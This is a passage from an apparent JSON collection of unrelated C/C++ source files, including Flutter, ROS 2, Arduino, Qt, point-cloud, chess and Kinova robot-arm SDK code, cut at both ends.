glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n\n    glBindVertexArray(this->VAO);\n    glEnableVertexAttribArray(0);\n    glVertexAttribPointer(0, 4, GL_FLOAT, GL_FALSE, 4",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#define PCL_NO_PRECOMPILE\n\n#include <pcl/pcl_base.h>\n#include <pcl/filters/voxel_grid.h>\n#include <pcl/filters/impl/voxel_grid.hpp>\n#include <pcl/pcl_macros.h>\n#include <pcl/point_types.h>\n#include <pcl/point_cloud.h>\n#include <pcl/io/pcd_io.h>\n#include \"pcd_extension.hpp\"\n\nvoid zero_initialize_PointXYZVector(VKJYPointXYZVector *point){\n    for(int i=0; i<NUM_CLASS_PCD; i++){\n        point->cVec[i] = 0.0;\n    }\n}\n\nvoid free_initialize_PointXYZVector(VKJYPointXYZVector *point){\n    point->cVec[0] = 1.0;\n    for(int i=1; i<NUM_CLASS_PCD; i++){\n        point->cVec[i] = 0.0;\n    }\n}\n\nvoid get_from_PointXYZVector(const VKJYPointXYZVector *point, vsemantic_bki::point3f &s_point, std::vector<double> &prob_vector){\n    s_point.x() = point->x;\n    s_point.y() = point->y;\n    s_point.z() = point->z;\n\n    prob_vector.resize(NUM_CLASS_PCD);\n    for(int i=0; i<NUM_CLASS_PCD; i++){\n        prob_vector[i] = point->cVec[i];\n    }\n}\n\nvoid save_std_vector_PointXYZVector(VKJYPointXYZVector *point, std::vector<double> vector){\n    if(vector.size() != NUM_CLASS_PCD + 3){\n        std::cout << \"ERROR! vector size should be ${NUM_CLASS_PCD} + 3!\" << std::endl;  \n    }else{\n        point->x = vector[0]; point->y = vector[1]; point->z = vector[2];\n\n        for(int i=0; i<NUM_CLASS_PCD; i++){\n            point->cVec[i] = vector[3+i];\n        }\n    }\n}\nvoid save_std_vector_PointXYZVector(VKJYPointXYZVector *point, float x, float y, float z, std::vector<double> vector){\n    if(vector.size() != NUM_CLASS_PCD){\n        std::cout << \"ERROR! vector size should be ${NUM_CLASS_PCD}!\" << std::endl;  \n    }else{\n        point->x = x; point->y = y; point->z = z;\n\n        for(int i=0; i<NUM_CLASS_PCD; i++){\n            point->cVec[i] = vector[i];\n        }\n    }\n}\n\nvoid print_PointXYZVector(const VKJYPointXYZVector *point){\n    std::cout << \"(\" << point->x << \", \" << point->y << \", \" << point->z << \")\";\n    std::cout << \" - probability [\";\n    \n    for(int i=0; i<NUM_CLASS_PCD - 1; i++){\n        std::cout << point->cVec[i] << \", \";\n    }\n    std::cout << point->cVec[NUM_CLASS_PCD - 1] << \"]\\n\";\n}\nvoid print_PointXYZVector(const vsemantic_bki::point3f p, const std::vector<double> prob_vector){\n    if(prob_vector.size() != NUM_CLASS_PCD){\n        std::cout << \"ERROR:print_PointXYZVector - size: \" << std::to_string(prob_vector.size()) << std::endl;\n        return;\n    }\n    std::cout << \"(\" << p.x() << \", \" << p.y() << \", \" << p.z() << \")\";\n    std::cout << \" - probability [\";\n\n    for(int i=0; i< NUM_CLASS_PCD; i++){\n        std::cout << prob_vector[i];\n        if(i+1 != NUM_CLASS_PCD)\n            std::cout << \", \";\n    }\n    std::cout << \"]\\n\";\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"frist_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <cmath>\n#include <rclcpp/rclcpp.hpp>\n#include <chrono>\n#include <functional>\n#include <geometry_msgs/msg/twist.hpp>\n\nusing namespace std::chrono_literals;\n\nclass VelParam: public rclcpp::Node\n{\n  public:\n    VelParam()\n      : Node(\"param_vel_node\")\n    {\n      auto param_desc = rcl_interfaces::msg::ParameterDescriptor{};\n      param_desc.description = \"Sets the velocity (in m/s) of the robot.\";\n      this->declare_parameter<std::double_t>(\"velocity\", 0.0, param_desc);\n      timer_ = this->create_wall_timer(\n      1000ms, std::bind(&VelParam::timer_callback, this));\n      publisher_ = this->create_publisher<geometry_msgs::msg::Twist>(\"cmd_vel\", 10);\n    }\n    void timer_callback()\n    {\n      this->get_parameter(\"velocity\", vel_parameter_);\n      RCLCPP_INFO(this->get_logger(), \"Velocity parameter is: %f\", vel_parameter_);\n      auto message = geometry_msgs::msg::Twist();\n      message.linear.x = vel_parameter_;\n      publisher_->publish(message);\n    }\n  private:\n    std::double_t vel_parameter_;\n    rclcpp::TimerBase::SharedPtr timer_;\n    rclcpp::Publisher<geometry_msgs::msg::Twist>::SharedPtr publisher_;\n};\n\nint main(int argc, char** argv)\n{\n  rclcpp::init(argc, argv);\n  rclcpp::spin(std::make_shared<VelParam>());\n  rclcpp::shutdown();\n  return 0;\n}",
    "#include \"Arduino.h\"\n#include \"config.h\"\n#include \"def.h\"\n#include \"types.h\"\n#include \"MultiWii.h\"\n#include \"Alarms.h\"\n#include \"EEPROM.h\"\n#include \"Output.h\"\n#include \"RX.h\"\n#include \"Serial.h\"\n#include \"Sensors.h\"\n#include \"LCD.h\"\n\nvoid __u8Inc(void * var, int16_t inc);\nvoid __s8Inc(void * var, int16_t inc);\nvoid __u16Inc(void * var, int16_t inc);\nvoid __s16Inc(void * var, int16_t inc);\nvoid __nullInc(void * var, int16_t inc);\nvoid __u8Fmt(void * var, uint8_t mul, uint8_t dec);\nvoid __u16Fmt(void * var, uint8_t mul, uint8_t dec);\nvoid __s8BitsFmt(void * var, uint8_t mul, uint8_t dec);\nvoid __s16Fmt(void * var, uint8_t mul, uint8_t dec);\nvoid __uAuxFmt(void * var, uint8_t mul, uint8_t dec, uint8_t aux);\nvoid __uAuxFmt1(void * var, uint8_t mul, uint8_t dec);\nvoid __uAuxFmt2(void * var, uint8_t mul, uint8_t dec);\nvoid __uAuxFmt3(void * var, uint8_t mul, uint8_t dec);\nvoid __uAuxFmt4(void * var, uint8_t mul, uint8_t dec);\nvoid __upMFmt(void * var, uint8_t mul, uint8_t dec);\n\nvoid serviceCheckPLog(void);\nvoid i2c_clear_OLED(void);\nvoid LCDnextline(void);\nvoid i2c_OLED_DIGOLE_send_string(const char *string);\n\n// ************************************************************************************************************\n// LCD & display & monitoring\n// ************************************************************************************************************\n// in any of the following cases an LCD is required and\n// the primitives for exactly one of the available types are setup\n#if defined(LCD_CONF) || defined(LCD_TELEMETRY) || defined(HAS_LCD)\nstatic char line1[17],line2[17];\nstatic char template7[7] = \" .... \";\nstatic char template3[3] = \". \";\n\n\n#ifdef DISPLAY_FONT_DSIZE\n  static uint8_t line_is_valid = 0;\n#endif\n#if ( defined(LOG_PERMANENT) && defined(DISPLAY_MULTILINE) )\n  static uint8_t lnr = 0;\n#endif\n\n#define LCD_FLUSH {/*UartSendData();*/ delay(30); }\n\nchar digit10000(uint16_t v) {return '0' + v / 10000;}\nchar digit1000(uint16_t v) {return '0' + v / 1000 - (v/10000) * 10;}\nchar digit100(uint16_t v) {return '0' + v / 100 - (v/1000) * 10;}\nchar digit10(uint16_t v) {return '0' + v / 10 - (v/100) * 10;}\nchar digit1(uint16_t v) {return '0' + v - (v/10) * 10;}\n\n#if defined(OLED_I2C_128x64)\n// ########################################\n// #  i2c OLED display funtion primitives #\n// ########################################\n#define OLED_address   0x3C     // OLED at address 0x3C in 7bit\nchar LINE_FILL_STRING[] = \"                      \"; // Used by clear_OLED() 128 bits / 6 bytes = 21 chars per row  \nunsigned char CHAR_FORMAT = 0;      // use to INVERSE characters\n// use INVERSE    CHAR_FORMAT = 0b01111111;\n// use NORMAL     CHAR_FORMAT = 0;\nstatic char buffer; // buffer to read bytes from ROM, using pgm_read_byte macro. NB! avr/pgmspace.h must be included prog_uchar LOGO[] PROGMEM = {  // My first attempt to flash a logo....\nconst uint8_t PROGMEM LOGO[] = { // logo....\n    0x00, 0x00, 0x02, 0xFE, 0xFE, 0x0E, 0xFC, 0xF8, 0xC0, 0x00, 0xC0, 0xF8, 0xFC, 0x0E, 0xFE, 0xFE,\n    0xFE, 0x02, 0x00, 0x00, 0x30, 0xF0, 0xF0, 0x00, 0x00, 0x00, 0x30, 0xF0, 0xF0, 0x00, 0x00, 0x00,\n    0x02, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x30, 0xF8, 0xFE, 0x30, 0x30, 0x30, 0x00, 0x00, 0x30, 0xF6,\n    0xF6, 0x00, 0x00, 0x00, 0x02, 0x06, 0x1E, 0xFE, 0xFE, 0xC2, 0x00, 0xC2, 0xFE, 0x7E, 0xFE, 0xC2,\n    0x00, 0xC2, 0xFE, 0xFE, 0x3E, 0x06, 0x02, 0x00, 0x30, 0xF6, 0xF6, 0x00, 0x00, 0x00, 0x00, 0x30,\n    0xF6, 0xF6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x10, 0x1F, 0x1F, 0x10, 0x00, 0x83, 0x9F, 0x9F, 0x9F, 0x83, 0x80, 0x90, 0x9F, 0x9F,\n    0x9F, 0x10, 0x00, 0x00, 0x00, 0x0F, 0x1F, 0x18, 0x18, 0x18, 0x0C, 0x1F, 0x1F, 0x10, 0x00, 0x00,\n    0x10, 0x1F, 0x1F, 0x10, 0x00, 0x80, 0x80, 0x8F, 0x9F, 0x98, 0x9E, 0x8F, 0x80, 0x80, 0x90, 0x1F,\n    0x1F, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x1F, 0x1E, 0x1F, 0x03, 0x00, 0x07, 0x1F,\n    0x1E, 0x1F, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x1F, 0x1F, 0x10, 0x00, 0x00, 0x00, 0x10,\n    0x1F, 0x1F, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0xC0, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00,\n    0x00, 0xC0, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0xE0, 0xF8, 0x3C, 0x0E, 0x07, 0x03, 0x03, 0x01, 0x81, 0xC1, 0xC1, 0xC1, 0xC1, 0x81, 0x01,\n    0x03, 0x03, 0x07, 0x0E, 0x3C, 0xF8, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0,\n    0xF8, 0x3C, 0x0E, 0x07, 0x03, 0x03, 0x01, 0x81, 0xC1, 0xC1, 0xC1, 0xC1, 0x81, 0x01, 0x03, 0x03,\n    0x07, 0x0E, 0x3C, 0xF8, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0",
    "// Project: Schachfeld_Engine\n// Author: Rombelstielzchen\n// License: GPLv3\n// Forum: https://www.schachfeld.de/threads/40956-einen-namen-fuer-das-baby\n\n#include \"board.h\"\n\n#include <cassert>\n#include <string>\n\n#include \"fen_parser.h\"\n\nCBoard::CBoard() {\n    assert(FILE_LAST == BOARDSIZE_X - 1);\n    assert(RANK_NEWLINE_CHARACTER == BOARDSIZE_Y - 1);\n    init_garden_fence();\n    clear();\n    const std::string START_POSITION = \"rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1\";\n    set_fen_position(START_POSITION);\n}\n\nvoid CBoard::init_garden_fence() {\n    for (int j = 0; j < BOARDSIZE_X; ++j) {\n        for (int k = 0; k < BOARDSIZE_Y; ++k) {\n            squares[j][k] = GARDEN_FENCE;\n        }\n        squares[j][RANK_NEWLINE_CHARACTER] = '\\n';\n    }\n    // Data ends with newline and string-termination for using as_iss()\n    squares[FILE_LAST][RANK_NEWLINE_CHARACTER - 1] = '\\n';\n    squares[FILE_LAST][RANK_NEWLINE_CHARACTER] = '\\0';\n}\n\nvoid CBoard::clear() {\n    for (int j = FILE_A; j<= FILE_H; ++j) {\n        for (int k = RANK_1; k <= RANK_8; ++k) {\n            squares[j][k] = EMPTY_SQUARE;\n        }\n    }\n}\n\nbool CBoard::set_fen_position(const std::string &position) {\n    clear();\n    squares[4][5] = 'A';\n    return CFenParser::parse(*this, position);\n}\n\nconst std::string CBoard::get_fen_position() {\n    std::string result = \"TODO\";\n    return result;\n}\n\nconst char* const CBoard::as_is() const {\n    assert(squares.back().back() == '\\0');\n    return &squares[0][0];\n}\n\n\nconst TSquare CBoard::get_square(EFiles x, ERanks y) {\n    return squares[x][y];\n}\n",
    "#include <Wire.h>\n#include <Adafruit_VL53L0X.h>\n\n// Define SDA and SCL pins explicitly\n#define SDA_PIN 4  // D2\n#define SCL_PIN 5  // D1\n\nAdafruit_VL53L0X lox = Adafruit_VL53L0X();\n\nconst int calibration_offset = 2; // Adjust this value based on your testing\nconst int num_samples = 10; // Number of samples to take for averaging\n\nvoid setup() {\n  Serial.begin(115200);  // Initialize serial communication at 115200 baud rate\n  Wire.begin(SDA_PIN, SCL_PIN);    // Initialize I2C communication with SDA and SCL\n\n  if (!lox.begin()) {\n    Serial.println(F(\"Failed to boot VL53L0X\"));\n    while (1);\n  }\n  Serial.println(F(\"VL53L0X Ready\"));\n}\n\nvoid loop() {\n  long sum = 0;\n  int valid_samples = 0;\n\n  for (int i = 0; i < num_samples; i++) {\n    VL53L0X_RangingMeasurementData_t measure;\n    lox.rangingTest(&measure, false);  // Perform a ranging test\n\n    if (measure.RangeStatus != 4) {  // Check if measurement is valid\n      int distance_mm = measure.RangeMilliMeter;\n      int calibrated_distance_mm = distance_mm - calibration_offset;  // Apply manual offset\n      sum += calibrated_distance_mm;\n      valid_samples++;\n    }\n\n    delay(100);  // Wait for 100 milliseconds between samples\n  }\n\n  if (valid_samples > 0) {\n    int average_distance = sum / valid_samples;\n    Serial.print(\"Average Distance (mm): \");\n    Serial.println(average_distance);  // Print average distance in mm\n  } else {\n    Serial.println(\"No valid samples collected\");\n  }\n\n  delay(1000);  // Wait for 1 second before the next set of readings\n}\n",
    "// #include <iostream>\n// using namespace std;\n\n// int main() {\n//     int num, tag;\n//     cout<< \"Enter the number: \";\n//     cin >> num;\n\n//     for(int i = 2; i<num; i++) {\n\n//         if( num%i == 0 ){\n//             tag = 0;\n//             cout << num << \" this number is not a prime number.\" << endl;\n//             break;\n//         }\n//         tag = 1; //this will deside that number is prime of not\n//     }\n\n//     if(tag == 1){\n//         cout << num << \" this number is a prime number.\" << endl;\n//     }\n//     return 0;\n// }\n\n// second and efficient aproach.\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n    int num, tag;\n    cout << \"Enter the Number for checking prime number: \";\n    cin >> num;\n    for (int i = 2; i * i <= num; i++)\n    {\n        if (num % i == 0)\n        {\n            tag = 0;\n            cout << \"The Number '\" << num << \"' is Prime Not Number.\" << endl;\n            break;\n        }\n    }\n    if (tag != 0)\n    {\n        cout << \"The Number '\" << num << \"' is Prime Number.\" << endl;\n    }\n    return 0;\n}",
    "/**\n*********************************************************************\n*********\n* @project_name :write_demo\n* @file : Bridge.cpp\n* @author : zen3\n* @brief : None\n* @attention : None\n* @date : 2024/8/2 \n*********************************************************************\n*********\n*/\n//\n\n#include \"bridge.h\"\n#include \"Serial/hardware_serial/SerialPort.h\"\ndata_device::SerialPort * Serial;\n//uint8_t flag=0;\nvoid test_uart(){\n    Serial=new data_device::SerialPort(&huart1);\n//    Serial->println(\"hello world\");\n    *Serial<<\"hello world wow\"<<endl;\n    Serial->print(\"beautiful a day\");\n    Serial->println();\n    Serial->println(3.1415,3);\n    Serial->println(322,HEX);\n    Serial->println(322,OCT);\n    Serial->println(322,BIN);\n    Serial->println(\"this is c style %d\",22);\n    //show String\n    String s1 = \"application\";\n    String s2 = \"is my\";\n\n    Serial->println(s1+s2);\n\n    Serial->println(s1+\" hello world\");\n    //If you want to print a command\n    Serial->print(\"AT + OK\");\n    //It is the fastest because the write function is called directly,\n    // blocking sending it is completed first\n}\nvoid setup(){\n    test_uart();\n}\nvoid loop(){\n    String inString=\"\";\n    while (Serial->available()>0){\n        inString=Serial->readString();\n        if (Serial->available()==0){\n            //If you display the return to use it like I do,\n            // there will be errors.\n            Serial->print(inString);\n        }\n\n    }\n    // \u68c0\u67e5\u662f\u5426\u63a5\u6536\u5230\u6570\u636e\uff0c\u5982\u679c\u63a5\u6536\u5230\u6570\u636e\uff0c\u5219\u8f93\u51fa\u8be5\u6570\u636e\n\n\n}",
    "#include \"button.h\"\n#include <QPainter>\n#include <QPainterPath>\n\nconstexpr int s_borderSize{4};\nconstexpr int s_borderRadius{10};\nconstexpr QColor s_defaultBorderColor{69, 69, 69}; // #454545\nconstexpr QColor s_backgroundColor{18, 18, 18}; // #121212\nconstexpr QColor s_highlightColor{255, 255, 255}; // #696969\n\nButton::Button(QWidget *parent, int buttonId)\n    : QWidget{parent}, m_buttonId{buttonId}\n{\n    setMaximumSize(80, 80);\n}\n\nint Button::id() const\n{\n    return m_buttonId;\n}\n\nvoid Button::paintEvent(QPaintEvent *event)\n{\n    QPainter painter(this);\n    painter.setRenderHint(QPainter::Antialiasing);\n\n    QColor borderColor = m_isClicked ? s_highlightColor : s_defaultBorderColor;\n\n    QRectF rect(s_borderSize / 2.0, s_borderSize / 2.0,\n                width() - s_borderSize, height() - s_borderSize);\n\n    QPainterPath path;\n\n    path.addRoundedRect(rect, s_borderRadius, s_borderRadius);\n    QPen pen(borderColor, s_borderSize);\n    painter.setPen(pen);\n    painter.fillPath(path, s_backgroundColor);\n    painter.drawPath(path);\n}\n\nvoid Button::mousePressEvent(QMouseEvent *event)\n{\n    emit clicked(m_buttonId);\n    m_isClicked = true;\n    update();\n}\n\nvoid Button::mouseReleaseEvent(QMouseEvent *event)\n{\n    m_isClicked = false;\n    update();\n}\n",
    "#include <iostream>\n#include <cmath>\n#include <array>\n#include <vector>\n\nstd::string substr(std::string str, int init, int quantity) {\n    std::string result;\n    for(int i=0; i < quantity;i++) {\n        result += str[init];\n        init++;\n    }\n    return result;\n}\n\nstd::string reverse(char c) {\n    std::string str;\n    if (c == '0') {\n        return str + '1';\n    }\n\n    return str + '0';\n}\n\nint pow(int num, int exp) {\n    int result = 1;\n    for(int i=0; i < exp; i++) {\n        result *= (num);\n    }\n\n    return result;\n}\n\nint convertToDecimal(std::string binaryMsg) {\n    int count = 0;\n    int result = 0;\n    for(int i=binaryMsg.size()-1; i >= 0; i--) {\n        if(binaryMsg[i] == '1') {\n            result += 1 * (pow(2,count));\n        }\n        count++;\n    }\n\n    return result;\n}\n\nchar decode(std::string msg) {\n    std::string result = substr(msg,4, 2) + reverse(msg[6]) + reverse(msg[7]) + substr(msg,0, 4);\n    return char(convertToDecimal(result));\n}\n\n\nint main() {\n    std::string msg = \"10010110 11110111 01010110 00000001 00010111 00100110 01010111 00000001 00010111 01110110 01010111 00110110 11110111 11010111 01010111 00000011\";\n\n    int first = 0;\n    int last = 8;\n    std::string result;\n    while (last < msg.size()) {\n        result += decode(substr(msg,first, last));\n        first = (last + 1);\n        last += 9;\n    }\n\n    std::cout << result << std::endl;\n}\n",
    "//to-do list  creates by NISHA PATEL Task 3 @codsoft \n#include <iostream>\n#include <vector>\n#include <string>\n\nusing namespace std;\n\n// Function to display the menu\nvoid displayMenu()\n {\n    cout <<\"welcome to TO DO LIST \"<<endl;\n     cout<<\"here some menu list for your betterment \"<<endl;\n    cout << \"1. Add task\\n\";\n    cout << \"2. View tasks\\n\";\n    cout << \"3. Mark task as completed\\n\";\n    cout << \"4. Exit\\n\";\n}\n\n// Function to add a task to the list\nvoid addTask(vector<string> & tasks) \n{\n   string task;\n    cout << \"Enter task: \";\n    cin>>task;\n   // getline(cin, task);\n    tasks.push_back(task);\n    cout << \"YOUR TASK ADDED SUCCESSFULLY !!!!\"<<endl;\n}\n\n// Function to view all tasks\nvoid viewTasks(const vector<string>& tasks)\n{\n    cout << \"Tasks:\"<<endl;\n    for (size_t i = 0; i < tasks.size(); ++i)\n    {\n        cout << i+1 << \". \" << tasks[i] << endl;\n    }\n}\n\n// Function to mark a task as completed\nvoid markCompleted(vector<string>& tasks) {\n    int index;\n    cout << \"Enter task number to mark as completed: \";\n    cin >> index;\n    if (index >= 1 && index <= tasks.size()) {\n        tasks.erase(tasks.begin() + index - 1);\n        cout << \"Task marked as completed!\\n\";\n    } else {\n        cout << \"Invalid task number!\\n\";\n    }\n}\n\nint main() {\n    vector<string> tasks;\n    int choice;\n\n    do {\n        displayMenu();\n        cout << \"Enter your choice: \";\n        cin >> choice;\n        cin.ignore(); // Ignore newline character left in the input buffer\n        switch (choice) {\n            case 1:\n                addTask(tasks);\n                break;\n            case 2:\n                viewTasks(tasks);\n                break;\n            case 3:\n                markCompleted(tasks);\n                break;\n            case 4:\n                cout << \"Exiting program...\\n\";\n                break;\n            default:\n                cout << \"Invalid choice!\\n\";\n        }\n    } while (choice != 4);\n\n    return 0;\n}",
    "\n#include \"JacoSDKWrapper.h\"\n\n#include \"mex.h\"\n\n\nusing namespace std;\n\n//A handle to the API.\nHINSTANCE commandLayer_handle = NULL;\n\n//Function pointers to the functions we need\nint(*MyInitAPI)();\nint(*MyCloseAPI)();\nint(*MyGetGeneralInformations)(GeneralInformations &Response);\nint(*MyGetDevices)(KinovaDevice devices[MAX_KINOVA_DEVICE], int &result);\nint(*MySetActiveDevice)(KinovaDevice device);\n\n//int(*MyGetAngularCommand)(AngularPosition &);\nint(*MyGetAngularPosition)(AngularPosition &);\nint (*MyGetAngularCommand)(AngularPosition &);\nint(*MyGetAngularVelocity)(AngularPosition &Response);\nint(*MyGetAngularForce)(AngularPosition &Response);\nint(*MyGetCartesianPosition)(CartesianPosition &);\nint (*MyGetCartesianCommand)(CartesianPosition &);\nint (*MyGetCartesianForce)(CartesianPosition &);\nint (*MyMoveHome)();\nint(*MySetTorqueSafetyFactor)(float factor);\nint(*MySetTorqueVibrationController)(float value);\nint(*MySwitchTrajectoryTorque)(GENERALCONTROL_TYPE);\nint(*MySetTorqueControlType)(TORQUECONTROL_TYPE type);\nint(*MyRunGravityZEstimationSequence)(ROBOT_TYPE type, double OptimalzParam[OPTIMAL_Z_PARAM_SIZE]);\nint(*MySetGravityOptimalZParam)(float Command[GRAVITY_PARAM_SIZE]);\nint(*MySetGravityType)(GRAVITY_TYPE Type);\nint (*MyInitFingers)();\nint(*MySendBasicTrajectory)(TrajectoryPoint command);\nint(*MySendAngularTorqueCommand)(float Command[COMMAND_SIZE]);\nint (*MyGetCodeVersion)(int Response[CODE_VERSION_COUNT]);\nint (*MyStartForceControl)();\nint (*MyStopForceControl)();\nint (*MyGetEndEffectorOffset)(unsigned int*, float*, float*, float*);\nint (*MySetEndEffectorOffset)(unsigned int status, float x, float y, float z);\nint (*MyGetProtectionZone)(ZoneList &Response);\nint (*MyEraseAllProtectionZones)();\nint (*MySetProtectionZone)(ZoneList Command);\nint (*MySetCartesianControl)();\nint (*MyGetGlobalTrajectoryInfo)(TrajectoryFIFO &Response);\nint (*MySendAdvanceTrajectory)(TrajectoryPoint command);\nint (*MySetPositionLimitDistance)(float Command[COMMAND_SIZE]);\nint (*MySetActuatorPID)(unsigned int address, float P, float I, float D);\nint (*MyRefresDevicesList)();\n\n\n\n\n\nKinovaDevice list[MAX_KINOVA_DEVICE];\nint devicesCount;\n\n\nbool openKinovaLibrary()\n{\n    int result;\n    mexPrintf(\"Loading library...\"); \n    if(commandLayer_handle == NULL )\n    {\n        mexPrintf(\"Loading library...\"); \n        commandLayer_handle = LoadLibrary(\"CommandLayerWindows.dll\");\n//         For Ethernet control choose CommandLayerEthernet.dll\n//         commandLayer_handle = LoadLibrary(\"CommandLayerEthernet.dll\");\n        if(commandLayer_handle == NULL )\n        {\n            mexPrintf(\"Failed to load library.\\n\");\n            return false;\n        }\n        mexPrintf(\" Success\\n\");\n    }\n    else\n    {\n        mexPrintf(\"Library is already loaded.\\n\");\n    }\n    \n    if (MyInitAPI != NULL)\n    {\n        mexPrintf(\"API is already open.\\n\");\n        return true;\n    }\n    \n    // Try to open API\n    mexPrintf(\"Initializating APIs...\");\n\n    //We load the functions from the library (Under Windows, use GetProcAddress)\n    MyInitAPI = (int(*)()) GetProcAddress(commandLayer_handle, \"InitAPI\");\n    MyCloseAPI = (int(*)()) GetProcAddress(commandLayer_handle, \"CloseAPI\");\n    MyGetGeneralInformations = (int(*)(GeneralInformations &info)) GetProcAddress(commandLayer_handle, \"GetGeneralInformations\");\n\n    MyGetDevices = (int(*)(KinovaDevice devices[MAX_KINOVA_DEVICE], int &result)) GetProcAddress(commandLayer_handle, \"GetDevices\");\n    MySetActiveDevice = (int(*)(KinovaDevice devices)) GetProcAddress(commandLayer_handle, \"SetActiveDevice\");\n    MyGetAngularCommand = (int (*)(AngularPosition &)) GetProcAddress(commandLayer_handle,\"GetAngularCommand\");\n    MyGetAngularPosition = (int(*)(AngularPosition &)) GetProcAddress(commandLayer_handle, \"GetAngularPosition\");\n    MyGetAngularVelocity = (int(*)(AngularPosition &)) GetProcAddress(commandLayer_handle, \"GetAngularVelocity\");\n    MyGetAngularForce = (int(*)(AngularPosition &Response)) GetProcAddress(commandLayer_handle, \"GetAngularForce\");\n  \tMyGetCartesianPosition = (int(*)(CartesianPosition &)) GetProcAddress(commandLayer_handle, \"GetCartesianPosition\");\n    MyGetCartesianCommand = (int(*)(CartesianPosition &)) GetProcAddress(commandLayer_handle, \"GetCartesianCommand\");\n    MyGetCartesianForce = (int (*)(CartesianPosition &)) GetProcAddress(commandLayer_handle,\"GetCartesianForce\");\n    MyMoveHome = (int (*)()) GetProcAddress(commandLayer_handle,\"MoveHome\");\n    \n    MySetTorqueSafetyFactor = (int(*)(float)) GetProcAddress(commandLayer_handle, \"SetTorqueSafetyFactor\");\n    MySetTorqueVibrationController = (int(*)(float)) GetProcAddress(commandLayer_handle, \"SetTorqueVibrationController\");\n    MySwitchTrajectoryTorque = (int(*)(GENERALCONTROL_TYPE)) GetProcAddress(commandLayer_handle, \"SwitchTrajectoryTorque\");\n    MySetTorqueControlType = (int(*)(TORQUECONTROL_TYPE)) GetProcAddress(commandLayer_handle, \"SetTorqueControlType\");\n    MyRunGravityZEstimationSequence = (int(*)(ROBOT_TYPE, double Optima",
